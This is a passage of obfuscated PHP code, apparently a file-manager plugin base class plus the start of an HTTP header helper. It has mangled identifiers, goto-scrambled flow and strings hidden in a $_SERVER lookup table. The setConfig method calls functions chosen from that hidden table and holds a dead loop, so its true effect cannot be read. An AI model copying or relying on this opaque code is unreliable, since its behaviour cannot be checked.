FÚ×¥®Úİ; FÚ×¥®Úİ: } global $in, $config; goto c½…§·­•Ê; dÁµŠß: $this->values = array(); return $this; goto d£ëƒî¾¯˜; cª´ØñÉõÛ: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $fõ—¦Àƒ[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $fõ—¦Àƒ[8]; $this->pluginLangArr = $this->initLang(); goto dÁµŠß; c½…§·­•Ê: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($fõ—¦Àƒ[1287]); goto c´ô×Õ„; d£ëƒî¾¯˜: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[£ü][1289]); } protected function assign($dø·§·¦‡Ü, $FëÒõïğøÍ = false) { if (is_array($dø·§·¦‡Ü)) { $this->values = array_merge($this->values, $dø·§·¦‡Ü); } else { $this->values[$dø·§·¦‡Ü] = $FëÒõïğøÍ; } } protected function display($b‡²Šòƒß›) { extract($this->values); require $b‡²Šòƒß›; } final function hookRegist($F‰·‚¸àÆŒ) { $this->modelPlugin->appRegist($this->pluginName, $F‰·‚¸àÆŒ); } final function appIcon() { $d¨°ÀğÓïõ =& $_SERVER[£ü]; $fù½«Âßõ = $this->appPackage(); $DÄ×ÔÎŠ¸î = $d¨°ÀğÓïõ[33]; if (isset($fù½«Âßõ[$d¨°ÀğÓïõ[379]])) { if (isset($fù½«Âßõ[$d¨°ÀğÓïõ[379]][$d¨°ÀğÓïõ[1290]])) { $DÄ×ÔÎŠ¸î = $d¨°ÀğÓïõ[1291] . $fù½«Âßõ[$d¨°ÀğÓïõ[379]][$d¨°ÀğÓïõ[1290]] . $d¨°ÀğÓïõ[1292]; } else { if ($fù½«Âßõ[$d¨°ÀğÓïõ[379]][$d¨°ÀğÓïõ[1293]]) { $DÄ×ÔÎŠ¸î = $d¨°ÀğÓïõ[1294] . $fù½«Âßõ[$d¨°ÀğÓïõ[379]][$d¨°ÀğÓïõ[1293]] . $d¨°ÀğÓïõ[1295]; } } } return $DÄ×ÔÎŠ¸î; } final function fileCanView($A®¶‰”Ä¦Á) { $EšÔ£ÛìĞÜ =& $_SERVER[£ü]; if (request_url_safe($A®¶‰”Ä¦Á)) { return !0; } if ($this->isShare($A®¶‰”Ä¦Á)) { return !0; } if (!Action($EšÔ£ÛìĞÜ[1296])->authCan($EšÔ£ÛìĞÜ[1297])) { show_tips(LNG($EšÔ£ÛìĞÜ[1298]) . $EšÔ£ÛìĞÜ[1299], !1); } ActionCall($EšÔ£ÛìĞÜ[1300], $A®¶‰”Ä¦Á); } final function isShare($dé´Ú©ÂÓ±) { $aÒ©¯½ÆŒ = KodIO::parse($dé´Ú©ÂÓ±); return $aÒ©¯½ÆŒ[$_SERVER[£ü][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($FŒ¯•©ôŒÒ) { if (request_url_safe($FŒ¯•©ôŒÒ)) { return $FŒ¯•©ôŒÒ; } if (!$this->isShare($FŒ¯•©ôŒÒ)) { $FŒ¯•©ôŒÒ = $this->filePath($FŒ¯•©ôŒÒ); } return Action($_SERVER[£ü][1005])->linkOut($FŒ¯•©ôŒÒ); } public function filePathLinkOut($EÌÁ´—Œ—) { if (request_url_safe($EÌÁ´—Œ—)) { return $EÌÁ´—Œ—; } $this->fileCanView($EÌÁ´—Œ—); return Action($_SERVER[£ü][1005])->link($EÌÁ´—Œ—); } final function filePath($E´ĞŞ„„†) { $fôŞ’–ÔÓí =& $_SERVER[£ü]; if ($bİ«ŞÕÖ¤¸ = $this->checkSharePath($E´ĞŞ„„†)) { return $bİ«ŞÕÖ¤¸; } $this->fileCanView($E´ĞŞ„„†); if (request_url_safe($E´ĞŞ„„†)) { $c¥œšìâÊƒ = parse_url_query($E´ĞŞ„„†); if (isset($c¥œšìâÊƒ[$fôŞ’–ÔÓí[1301]]) && isset($c¥œšìâÊƒ[$fôŞ’–ÔÓí[194]])) { $DœÕ›šÊó = Model($fôŞ’–ÔÓí[1078])->get($fôŞ’–ÔÓí[1302]); $EÇ”„í®‘ = Mcrypt::decode($c¥œšìâÊƒ[$fôŞ’–ÔÓí[194]], $DœÕ›šÊó); if ($EÇ”„í®‘) { $this->fileInfo = IO::infoWithChildren($EÇ”„í®‘); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $EÇ”„í®‘; } } $E´ĞŞ„„† = $this->_cacheHttpFile($E´ĞŞ„„†); $this->fileInfo = IO::infoWithChildren($E´ĞŞ„„†); } else { $this->fileInfo = IO::infoWithChildren($E´ĞŞ„„†); if (!$this->fileInfo) { show_tips(LNG($fôŞ’–ÔÓí[102]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $E´ĞŞ„„†; } final function _cacheHttpFile($a¯îÙ„Äã) { $b–ƒ’Ì“× = hash_path($a¯îÙ„Äã, !0); $this->cachePath = $this->pluginCachePath($b–ƒ’Ì“×); if ($AîçÇÜ¨Ê‡ = IO::fileNameExist($this->cachePath, $b–ƒ’Ì“×)) { return KodIO::make($AîçÇÜ¨Ê‡); } $CÏ±Üäù¶ = $this->cachePath . $b–ƒ’Ì“×; return $this->pluginCacheFileSet($CÏ±Üäù¶, file_get_contents($a¯îÙ„Äã)); } final function _tmpFileName($Aáİâ£¯ùº = array()) { goto a¤‡ÁËÂ©Ú; b½ ì‰¨ÄÃ: if (isset($Aáİâ£¯ùº[$eÓĞĞˆœµë[159]][$eÓĞĞˆœµë[161]])) { return $Aáİâ£¯ùº[$eÓĞĞˆœµë[159]][$eÓĞĞˆœµë[161]]; } $E—ÑŒÈêÁ = array($Aáİâ£¯ùº[$eÓĞĞˆœµë[28]], $Aáİâ£¯ùº[$eÓĞĞˆœµë[75]], $Aáİâ£¯ùº[$eÓĞĞˆœµë[77]]); if (isset($Aáİâ£¯ùº[$eÓĞĞˆœµë[455]])) { $E—ÑŒÈêÁ[] = $Aáİâ£¯ùº[$eÓĞĞˆœµë[455]]; } goto DŒ…Ûç¯; DŒ…Ûç¯: return md5(implode($eÓĞĞˆœµë[70], $E—ÑŒÈêÁ)); goto dÛØ×“Ùõ; a¤‡ÁËÂ©Ú: $eÓĞĞˆœµë =& $_SERVER[£ü]; if (!$Aáİâ£¯ùº) { $Aáİâ£¯ùº = $this->fileInfo; } if (isset($Aáİâ£¯ùº[$eÓĞĞˆœµë[161]])) { return $Aáİâ£¯ùº[$eÓĞĞˆœµë[161]]; } goto b½ ì‰¨ÄÃ; dÛØ×“Ùõ: } final function checkSharePath($AÓáĞÓï˜«) { goto A¼Ì˜…›ù…; dÙâŸöªæ‡: $this->cachePath = $this->pluginCachePath($this->fileInfo[$D‡ê­[161]]); return $b…¿ó¼Ÿåî[$D‡ê­[75]]; goto a‹öÅåŞ¨; A¼Ì˜…›ù…: $D‡ê­ =& $_SERVER[£ü]; if (!defined($D‡ê­[423])) { define($D‡ê­[1303], 0); } if (!$this->isShare($AÓáĞÓï˜«)) { return !1; } goto c¬¶Ú«„„; c¬¶Ú«„„: $b…¿ó¼Ÿåî = Action($D‡ê­[1005])->sharePathInfo($AÓáĞÓï˜«); if (!isset($b…¿ó¼Ÿåî[$D‡ê­[75]])) { show_json(LNG($D‡ê­[1304]), !1); } $this->fileInfo = $b…¿ó¼Ÿåî[$D‡ê­[159]]; goto dÙâŸöªæ‡; a‹öÅåŞ¨: } final function pluginCachePath($aØ—šì•›¼ = '') { $b°Øó«êó— =& $_SERVER[£ü]; $f²‹”å‡å = IO_PATH_SYSTEM_TEMP . $b°Øó«êó—[1305] . $this->pluginName; if (!($càÌÒ†ö¢˜ = IO::infoFull($f²‹”å‡å))) { return IO::mkdir($f²‹”å‡å . $b°Øó«êó—[8] . $aØ—šì•›¼); } if (empty($aØ—šì•›¼)) { return $càÌÒ†ö¢˜[$b°Øó«êó—[75]]; } if (!($fß Î“ÔäŒ = IO::fileNameExist($càÌÒ†ö¢˜[$b°Øó«êó—[75]], $aØ—šì•›¼))) { return IO::mkdir($càÌÒ†ö¢˜[$b°Øó«êó—[75]] . $aØ—šì•›¼); } return KodIO::make($fß Î“ÔäŒ); } final function pluginCacheFileSet($Aƒ’ÁŠÅ·, $f´é…¡™© = '') { $dÂÈ¥ ƒ¬Ì =& $_SERVER[£ü]; if (!($A¤ÏÈ•§© = IO::infoFull($Aƒ’ÁŠÅ·))) { return IO::mkfile($Aƒ’ÁŠÅ·, $f´é…¡™©, REPEAT_REPLACE); } IO::setContent($A¤ÏÈ•§©[$dÂÈ¥ ƒ¬Ì[75]], $f´é…¡™©); return $A¤ÏÈ•§©[$dÂÈ¥ ƒ¬Ì[75]]; } final function pluginLocalFile($AøèƒÔ»°Ï = '') { goto cŞÈÔŠ¾íÃ; cŞÈÔŠ¾íÃ: $Dß‚²‘ÀÑÈ =& $_SERVER[£ü]; $dÒùÉù‡âš = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dÒùÉù‡âš)) { mk_dir($dÒùÉù‡âš); } goto Eª·æ±¸†á; B›„Ã†”…á: $Få¥¿¼­Ü = $dÒùÉù‡âš . $c²ÄŒƒÏ»; if (@file_exists($Få¥¿¼­Ü)) { return $Få¥¿¼­Ü; } return IO::copy($AøèƒÔ»°Ï, $dÒùÉù‡âš, 0, $c²ÄŒƒÏ»); goto CÄßŒ’„øÖ; Eª·æ±¸†á: if (!$AøèƒÔ»°Ï) { return $dÒùÉù‡âš; } $b´«ˆ„¡î = IO::info($AøèƒÔ»°Ï); $c²ÄŒƒÏ» = $this->_tmpFileName($b´«ˆ„¡î) . $Dß‚²‘ÀÑÈ[93] . $b´«ˆ„¡î[$Dß‚²‘ÀÑÈ[157]]; goto B›„Ã†”…á; CÄßŒ’„øÖ: } final function appPackage() { goto a‡ƒ¥´££ï; C½åºóŞöÏ: $this->parseLang($BŠ¬¨Å„‡Ş); $FñŒÚÚŠ§È = json_decode_force($BŠ¬¨Å„‡Ş); if (!$FñŒÚÚŠ§È) { return array(); } goto B½ßµÃœäË; a·Ù…Ä‰Ù: return $FñŒÚÚŠ§È; goto A®ùíÎê¡—; a‡ƒ¥´££ï: $AŠ´ø¶Õ—Æ =& $_SERVER[£ü]; if ($this->packageData) { return $this->packageData; } $BŠ¬¨Å„‡Ş = $this->parseFile($this->pluginPath . $AŠ´ø¶Õ—Æ[1306]); goto C½åºóŞöÏ; B½ßµÃœäË: $d„Ò©…˜µ  = Hook::trigger($AŠ´ø¶Õ—Æ[1307], $FñŒÚÚŠ§È); if ($d„Ò©…˜µ  && is_array($d„Ò©…˜µ )) { $FñŒÚÚŠ§È = $d„Ò©…˜µ ; } $this->packageData = $FñŒÚÚŠ§È; goto a·Ù…Ä‰Ù; A®ùíÎê¡—: } public function packageInfoGet($a¸§—„ö‰) { $fÃ­²šÆ‘ = $this->appPackage(); return array_get_value($fÃ­²šÆ‘, $a¸§—„ö‰); } public function packageVersion() { return $this->packageInfoGet($_SERVER[£ü][1308]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[£ü][1309]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[£ü][1310]); } private function parseFile($d±°”Â‚¢ò) { $F˜£¯ÒÄµ© =& $_SERVER[£ü]; $C»é¼¯Ì‚Ø = file_get_contents($d±°”Â‚¢ò); $bÄÑÂñßåÀ = array($F˜£¯ÒÄµ©[1311], $F˜£¯ÒÄµ©[1312], $F˜£¯ÒÄµ©[1313], $F˜£¯ÒÄµ©[1314], $F˜£¯ÒÄµ©[1315], $F˜£¯ÒÄµ©[1316], $F˜£¯ÒÄµ©[1317]); $D¢×ãê¨£² = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$F˜£¯ÒÄµ©[84]][$F˜£¯ÒÄµ©[1318]]); $C»é¼¯Ì‚Ø = str_replace($bÄÑÂñßåÀ, $D¢×ãê¨£², $C»é¼¯Ì‚Ø); return $C»é¼¯Ì‚Ø; } private function parseLang(&$aùöÆÏÛ‘Å) { goto bê£ãá÷‘; F°î”Ë²: $CİòÇà¦ÜŠ = array(); foreach ($EÊ®è³©¶[0] as $CÍåÌ§±í‰) { $e¼õ™˜ÁÒŒ = substr($CÍåÌ§±í‰, strlen($B¹¿ã§Œ÷‘), -4); $E…»Š“ãš = LNG($e¼õ™˜ÁÒŒ); $EøéˆâßŞ¶[] = $CÍåÌ§±í‰; $CİòÇà¦ÜŠ[] = str_replace(array($C¸ˆñì¤¬[214], $C¸ˆñì¤¬[980], $C¸ˆñì¤¬[327], $C¸ˆñì¤¬[113]), array($C¸ˆñì¤¬[50], $C¸ˆñì¤¬[50], $C¸ˆñì¤¬[33], $C¸ˆñì¤¬[1321]), $E…»Š“ãš); } $aùöÆÏÛ‘Å = str_replace($EøéˆâßŞ¶, $CİòÇà¦ÜŠ, $aùöÆÏÛ‘Å); goto bïâÈ˜Ù¾; añ¿‰Ü—²Å: preg_match_all($C¸ˆñì¤¬[1320], $aùöÆÏÛ‘Å, $EÊ®è³©¶); if (!is_array($EÊ®è³©¶) || count($EÊ®è³©¶) == 0 || !is_array($EÊ®è³©¶[0]) || count($EÊ®è³©¶[0]) == 0) { return; } $EøéˆâßŞ¶ = array(); goto F°î”Ë²; bê£ãá÷‘: $C¸ˆñì¤¬ =& $_SERVER[£ü]; $B¹¿ã§Œ÷‘ = $C¸ˆñì¤¬[1319]; if (!strstr($aùöÆÏÛ‘Å, $B¹¿ã§Œ÷‘)) { return; } goto añ¿‰Ü—²Å; bïâÈ˜Ù¾: } private function parseConfig(&$d®ù™¿É®Ñ) { goto fĞé…ÆÏ; C¶Âê‘„×: preg_match_all($CìÓ§ùØ¥[1323], $d®ù™¿É®Ñ, $aÀö­•¨­ø); if (!is_array($aÀö­•¨­ø) || count($aÀö­•¨­ø) == 0 || !is_array($aÀö­•¨­ø[0]) || count($aÀö­•¨­ø[0]) == 0) { return; } $CáÍé¥ƒ—© = $this->getConfig(); goto Ağ…‚ÏùŒœ; BÔÕÜ¾±Ø‘: $d®ù™¿É®Ñ = str_replace($f¸‘êĞæÕ”, $C¸ÕÀ¥ø›Ÿ, $d®ù™¿É®Ñ); goto f¸ºøÑ×±; Ağ…‚ÏùŒœ: $f¸‘êĞæÕ” = array(); $C¸ÕÀ¥ø›Ÿ = array(); foreach ($aÀö­•¨­ø[0] as $cáĞñ„Úï«) { $A¤·ëğ´º = substr($cáĞñ„Úï«, strlen($bÏåö—×»ñ), -2); $f¸‘êĞæÕ”[] = $cáĞñ„Úï«; $C¸ÕÀ¥ø›Ÿ[] = _get($CáÍé¥ƒ—©, $A¤·ëğ´º); } goto BÔÕÜ¾±Ø‘; fĞé…ÆÏ: $CìÓ§ùØ¥ =& $_SERVER[£ü]; $bÏåö—×»ñ = $CìÓ§ùØ¥[1322]; if (!strstr($d®ù™¿É®Ñ, $bÏåö—×»ñ)) { return; } goto C¶Âê‘„×; f¸ºøÑ×±: } private function parsePackage(&$AÖã‡ÔªÉø) { goto F­ Ü™¤; cÌ’šÎ½Ö‰: $AÖã‡ÔªÉø = str_replace($b½·÷á¹šô, $Aé¨ƒ«‡™—, $AÖã‡ÔªÉø); goto F¯£›ô­­; F­ Ü™¤: $E²îäÉøÈ¼ =& $_SERVER[£ü]; $D¯¾ˆ¿Óë = $E²îäÉøÈ¼[1324]; if (!strstr($AÖã‡ÔªÉø, $D¯¾ˆ¿Óë)) { return; } goto C‚µø†«¡„; E™–ùµ¾—Ü: $b½·÷á¹šô = array(); $Aé¨ƒ«‡™— = array(); foreach ($eí‰—‡´…´[0] as $FäÊöÁ„ëƒ) { $f›‚»ÄÄñ… = substr($FäÊöÁ„ëƒ, strlen($D¯¾ˆ¿Óë), -2); $b½·÷á¹šô[] = $FäÊöÁ„ëƒ; $Aé¨ƒ«‡™—[] = _get($bºİ½ÜÚ‰¦, $f›‚»ÄÄñ…); } goto cÌ’šÎ½Ö‰; C‚µø†«¡„: preg_match_all($E²îäÉøÈ¼[1325], $AÖã‡ÔªÉø, $eí‰—‡´…´); if (!is_array($eí‰—‡´…´) || count($eí‰—‡´…´) == 0 || !is_array($eí‰—‡´…´[0]) || count($eí‰—‡´…´[0]) == 0) { return; } $bºİ½ÜÚ‰¦ = $this->appPackage(); goto E™–ùµ¾—Ü; F¯£›ô­­: } final function echoFile($CÈ­°‹±¾¥, $FÁ¦¥¶Âã¯ = false) { goto dó®´ÀÀ½Â; F¤ÑÇù—: $e±ö†«Š = $this->parseFile($aøø³²Ñ½Ä); $this->parseLang($e±ö†«Š); $this->parseConfig($e±ö†«Š); goto BÉÈ²‚´­¼; dó®´ÀÀ½Â: $aÀÊĞëê±Â =& $_SERVER[£ü]; $aøø³²Ñ½Ä = $this->pluginPath . $CÈ­°‹±¾¥; if (ACT == $aÀÊĞëê±Â[1326]) { echo $aÀÊĞëê±Â[1327] . $this->pluginName . $aÀÊĞëê±Â[8] . $CÈ­°‹±¾¥ . $aÀÊĞëê±Â[1328]; if (!file_exists($aøø³²Ñ½Ä)) { echo $aÀÊĞëê±Â[1329]; return; } } goto F¤ÑÇù—; BÉÈ²‚´­¼: $this->parsePackage($e±ö†«Š); if (is_array($FÁ¦¥¶Âã¯)) { $e±ö†«Š = str_replace(array_keys($FÁ¦¥¶Âã¯), array_values($FÁ¦¥¶Âã¯), $e±ö†«Š); } echo $aÀÊĞëê±Â[214] . $e±ö†«Š; goto aÚÓ­èœ¹; aÚÓ­èœ¹: } final function initLang() { goto fªˆ…ß‹©; fªˆ…ß‹©: $eØŸÎ˜ =& $_SERVER[£ü]; $dõ¼áÒ«œ = $eØŸÎ˜[1330]; $a›Üˆ­¨Ş = $this->pluginPath . $eØŸÎ˜[1331]; goto fÎ‘‰Şˆ½Ë; Dî™Ğ…Á¹: if (!is_array($F®˜ìÒƒ§)) { return array(); } if (@count($F®˜ìÒƒ§) > 0) { I18n::set($F®˜ìÒƒ§); } return $F®˜ìÒƒ§; goto Dì¢§ãÜĞÒ; fÎ‘‰Şˆ½Ë: $E¿æ­„ÁÌØ = I18n::getType(); $F®˜ìÒƒ§ = array(); if (file_exists($a›Üˆ­¨Ş . $E¿æ­„ÁÌØ . $eØŸÎ˜[760])) { $F®˜ìÒƒ§ = (include $a›Üˆ­¨Ş . $E¿æ­„ÁÌØ . $eØŸÎ˜[760]); } else { if ($E¿æ­„ÁÌØ == $eØŸÎ˜[1332] && !file_exists($a›Üˆ­¨Ş . $E¿æ­„ÁÌØ . $eØŸÎ˜[760]) && file_exists($a›Üˆ­¨Ş . $eØŸÎ˜[1333])) { $F®˜ìÒƒ§ = (include $a›Üˆ­¨Ş . $eØŸÎ˜[1333]); } else { if (file_exists($a›Üˆ­¨Ş . $dõ¼áÒ«œ . $eØŸÎ˜[760])) { $F®˜ìÒƒ§ = (include $a›Üˆ­¨Ş . $dõ¼áÒ«œ . $eØŸÎ˜[760]); } } } goto Dî™Ğ…Á¹; Dì¢§ãÜĞÒ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($EÜ†„·°ùù) { $CæôôÇ“àÊ =& $_SERVER[£ü]; if ($_SERVER[$CæôôÇ“àÊ[723]] != $_SERVER[$CæôôÇ“àÊ[782]]) { goto CŠÄ¨ºæ´›; Dèµƒ—”™: $F½ÎôÁ¯êô = $F¾öËˆ‡íƒ($Aè·ºğğÅ); $a‰¯Š¨ˆÁ© = explode($CæôôÇ“àÊ[214], $F½ÎôÁ¯êô); if (count($a‰¯Š¨ˆÁ©) < $CæôôÇ“àÊ[566]) { $a‡®ëŞ‚ö = $CæôôÇ“àÊ[728]; $a‡®ëŞ‚ö(); } goto fôÒ·Ø©µ; fôÒ·Ø©µ: $e‰…ùÑé = $CæôôÇ“àÊ[784]; $e‰…ùÑé($_SERVER[$CæôôÇ“àÊ[785]]); $e‰…ùÑé($_SERVER[$CæôôÇ“àÊ[726]] . $CæôôÇ“àÊ[786]); goto f––‚©ù¢±; CŠÄ¨ºæ´›: $a¾¶«×õ«É = $CæôôÇ“àÊ[783]; $F¾öËˆ‡íƒ = $CæôôÇ“àÊ[725]; $Aè·ºğğÅ = $_SERVER[$CæôôÇ“àÊ[726]] . $CæôôÇ“àÊ[727]; goto Dèµƒ—”™; f––‚©ù¢±: $aİÕôÔƒ¡œ = 1; while ($aİÕôÔƒ¡œ > 1) { $aİÕôÔƒ¡œ = $aİÕôÔƒ¡œ + 4; $A›„ŞÀ¼¸ = rawurlencode($aİÕôÔƒ¡œ . $CæôôÇ“àÊ[358]); } goto e½ÒÊÖ¨; e½ÒÊÖ¨: } return $this->modelPlugin->setConfig($this->pluginName, $EÜ†„·°ùù); } public function onSetConfig($AÒ”§–ã½à) { } public function onGetConfig($B¢‚“Ø“ïÎ) { } public function onChangeStatus($C‹ôŸƒ®èß) { } public function onUninstall() { } public function onInstall() { } public function authCheck($DÌ„ë”·Ï½ = "\160\x6c\x75\x67\151\x6e\x41\x75\164\150") { $b¨ˆÄ‡ù =& $_SERVER[£ü]; if (!defined($b¨ˆÄ‡ù[423])) { return !1; } if (_get($GLOBALS, $b¨ˆÄ‡ù[453])) { return !0; } $AÙàÌÕ¤Í˜ = $this->getConfig(); if (!$AÙàÌÕ¤Í˜[$DÌ„ë”·Ï½]) { return !1; } return ActionCall($b¨ˆÄ‡ù[1334], $AÙàÌÕ¤Í˜[$DÌ„ë”·Ï½]); } public function url($aŒÃËí—Æ¡, $b‰¾±Æ†˜× = '', $bí‰îÈµ = true) { goto eˆ²½ä¾Ô¨; f¢Ñ·±¢­Ó: $E…öÓÓÇ£² = $this->packageVersion(); $F‹öÑ¾èà¡ = $D—¿£¯’³Ç . $cé¤‡›«ô[408] . $E…öÓÓÇ£²; if ($b‰¾±Æ†˜× == $cé¤‡›«ô[33]) { $B¦¥ÚÑ¥Üå = $this->pluginHost . $aŒÃËí—Æ¡ . $cé¤‡›«ô[1335] . $F‹öÑ¾èà¡; } else { if ($b‰¾±Æ†˜× === $cé¤‡›«ô[76]) { $B¦¥ÚÑ¥Üå = $this->pluginHost . $aŒÃËí—Æ¡; } else { if ($b‰¾±Æ†˜× == $cé¤‡›«ô[1336]) { $B¦¥ÚÑ¥Üå = STATIC_PATH . $aŒÃËí—Æ¡ . $cé¤‡›«ô[1335] . $D—¿£¯’³Ç; } else { if ($b‰¾±Æ†˜× == $cé¤‡›«ô[1337]) { $B¦¥ÚÑ¥Üå = APP_HOST . $cé¤‡›«ô[1338] . $aŒÃËí—Æ¡ . $cé¤‡›«ô[1335] . $D—¿£¯’³Ç; } else { if (isset($Bà²êã[$b‰¾±Æ†˜×])) { $B¦¥ÚÑ¥Üå = $Bà²êã[$b‰¾±Æ†˜×] . $aŒÃËí—Æ¡ . $cé¤‡›«ô[1335] . $F‹öÑ¾èà¡; } } } } } goto D›˜÷‘šÊ; D›˜÷‘šÊ: if (!$bí‰îÈµ) { return $B¦¥ÚÑ¥Üå; } echo $B¦¥ÚÑ¥Üå; goto F‚çóŠÂ‘Ş; eˆ²½ä¾Ô¨: $cé¤‡›«ô =& $_SERVER[£ü]; $Bà²êã = $this->getConfig(); $D—¿£¯’³Ç = KOD_VERSION . $cé¤‡›«ô[93] . KOD_VERSION_BUILD; goto f¢Ñ·±¢­Ó; F‚çóŠÂ‘Ş: } public function link($d«Øª÷Ñ˜ = false, $dˆßèÁÊ» = '') { $A‹ê²Ò‡«š =& $_SERVER[£ü]; if (!$d«Øª÷Ñ˜) { $this->link($A‹ê²Ò‡«š[1339], $A‹ê²Ò‡«š[1337]); $this->link($A‹ê²Ò‡«š[1340], $A‹ê²Ò‡«š[1336]); $this->link($A‹ê²Ò‡«š[1341], $A‹ê²Ò‡«š[1336]); $this->link($A‹ê²Ò‡«š[1342], $A‹ê²Ò‡«š[1336]); $this->link($A‹ê²Ò‡«š[1343], $A‹ê²Ò‡«š[1336]); return; } $aøîå‹œ = $this->url($d«Øª÷Ñ˜, $dˆßèÁÊ», !1); if (substr($d«Øª÷Ñ˜, -3) == $A‹ê²Ò‡«š[1344]) { echo $A‹ê²Ò‡«š[1345] . $aøîå‹œ . $A‹ê²Ò‡«š[1346] . $A‹ê²Ò‡«š[214]; } else { if (substr($d«Øª÷Ñ˜, -4) == $A‹ê²Ò‡«š[1347]) { echo $A‹ê²Ò‡«š[1348] . $aøîå‹œ . $A‹ê²Ò‡«š[1349] . $A‹ê²Ò‡«š[214]; } } } } goto B÷ŠàÄß¶¯; A«„‘»ãõá: class HttpHeader { public static $_headers = array("\x48\157\x73\x74" => "\110\124\x54\x50\x5f\110\x4f\x53\124", "\x55\163\145\162\x2d\101\x67\145\x6e\x74" => "\x48\x54\124\x50\137\x55\123\x45\x52\x5f\101\107\x45\116\124", "\103\157\156\x74\145\x6e\164\55\124\x79\x70\x65" => "\110\x54\x54\x50\x5f\x43\x4f\116\124\x45\116\x54\137\x54\131\120\105", "\x43\157\156\164\x65\156\x74\55\114\145\156\147\x74\150" => "\110\124\x54\x50\137\103\117\116\x54\105\116\x54\x5f\114\x45\116\x47\x54\110", "\x44\145\160\x74\x68" => "\110\x54\124\120\x5f\x44\105\x50\124\110", "\x45\170\160\145\143\164" => "\110\x54\x54\120\137\x45\x58\x50\x45\x43\124", "\111\146\x2d\x4e\x6f\x6e\145\55\115\141\x74\x63\150" => "\x48\x54\x54\x50\137\x49\x46\x5f\116\x4f\116\105\x5f\x4d\101\124\x43\x48", "\x49\146\55\x4d\141\164\x63\150" => "\x48\x54\x54\120\137\x49\106\137\115\x41\x54\x43\x48", "\111\146\x2d\122\141\x6e\147\x65" => "\x48\124\x54\x50\x5f\x49\x46\x5f\x52\x41\116\x47\105", "\x4c\141\x73\164\x2d\x4d\157\144\151\146\x69\145\144" => "\110\x54\124\120\137\x4c\101\123\124\x5f\115\x4f\104\x49\106\111\x45\x44", "\x49\x66\55\115\157\x64\x69\146\x69\x65\144\x2d\123\x69\156\143\x65" => "\x48\124\124\x50\137\x49\106\x5f\115\117\104\x49\106\x49\x45\104\137\x53\x49\x4e\x43\x45", "\111\x66\x2d\125\156\x6d\x6f\144\x69\146\151\145\144\x2d\123\x69\156\x63\145" => "\110\124\124\120\137\111\106\x5f\x55\116\115\117\x44\x49\x46\111\105\104\x5f\123\111\x4e\x43\105", "\x52\x61\x6e\147\x65" => "\x48\x54\124\120\137\x52\x41\116\x47\105", "\x54\151\155\x65\x6f\x75\x74" => "\x48\124\x54\120\137\124\x49\x4d\x45\117\x55\124", "\x49\146" => "\x48\x54\124\x50\x5f\111\x46", "\114\x6f\143\x6b\55\x54\x6f\x6b\x65\x6e" => "\110\124\x54\120\137\x4c\117\x43\x4b\x5f\124\x4f\113\105\116", "\x4f\166\145\x72\x77\162\151\164\145" => "\x48\x54\x54\x50\x5f\117\x56\105\122\127\122\x49\x54\105", "\104\x65\163\164\151\156\141\x74\x69\157\x6e" => "\x48\124\x54\x50\x5f\x44\105\x53\x54\x49\116\x41\124\111\117\x4e", "\122\x65\161\165\x65\x73\164\55\111\x64" => "\x52\105\x51\125\x45\123\124\x5f\111\104", "\x52\145\x71\x75\145\x73\x74\x2d\102\x6f\x64\171\x2d\106\x69\154\x65" => "\x52\x45\121\x55\105\x53\124\x5f\x42\117\x44\131\137\106\111\x4c\x45", "\122\145\144\x69\162\145\x63\x74\55\x53\x74\x61\x74\165\163" => "\x52\x45\x44\x49\x52\x45\103\x54\137\123\124\101\124\x55\x53"); public static function init() { static $BŒî¥ªÌæÇ = false; if ($BŒî¥ªÌæÇ) { return; } foreach ($_SERVER as $cãÏ™øŒ® => $còâÅÇƒªÉ) { $cãÏ™øŒ® = strtoupper($cãÏ™øŒ®); if (!array_key_exists($cãÏ™øŒ®, $_SERVER)) { continue; } $_SERVER[$cãÏ™øŒ®] = $còâÅÇƒªÉ; } foreach (self::$_headers as $cãÏ™øŒ® => $DŒÏÂ‰”Ú„) { if (!array_key_exists($cãÏ™øŒ®, $_SERVER)) { continue; } $_SERVER[$cãÏ™øŒ®] = $_SERVER[$DŒÏÂ‰”Ú„]; $_SERVER[strtoupper($cãÏ™øŒ®)] = $_SERVER[$DŒÏÂ‰”Ú„]; } } public static function get($EÈ±Ø½ŒĞ) { self::init(); return $_SERVER[$EÈ±Ø½ŒĞ] ? $_SERVER[$EÈ±Ø½ŒĞ] : $_SERVER[$_SERVER[£ü][1789] . strtoupper($EÈ±Ø½ŒĞ)]; } public static function method() { return strtoupper(self::get($_SERVER[£ü][151])); } public static function length() { $a¦³£İÙ¯í =& $_SERVER[£ü]; $fœ§Ã°¼–² = self::get($a¦³£İÙ¯í[1790]); if (!$fœ§Ã°¼–²) { $fœ§Ã°¼–² = self::get($a¦³£İÙ¯í[1128]); } return $fœ§Ã°¼–²; } public static function range() { $eÆ™îÉ¶µ =& $_SERVER[£ü]; $E¹ÜÔËÂì‰ = self::get($eÆ™îÉ¶µ[195]); if (!$E¹ÜÔËÂì‰) { return !1; } if (!preg_match($eÆ™îÉ¶µ[1791], $E¹ÜÔËÂì‰, $D¢•‹ï³)) { return !1; } if ($D¢•‹ï³[1] === $eÆ™îÉ¶µ[33] && $D¢•‹ï³[2] === $eÆ™îÉ¶µ[33]) { return !1; } return array($D¢•‹ï³[1] !== $eÆ™îÉ¶µ[33] ? $D¢•‹ï³[1] : null, $D¢•‹ï³[2] !== $eÆ™îÉ¶µ[33] ? $D¢•‹ï³[2] : null); } public static $statusCode = array("\61\60\60" => "\x43\157\156\x74\x69\x6e\x75\145", "\x31\60\x31" => "\x53\x77\151\x74\143\x68\151\156\147\x20\x50\162\157\164\x6f\143\x6f\154", "\x31\60\62" => "\x50\x72\x6f\x63\x65\163\163\x69\156\147", "\61\60\63" => 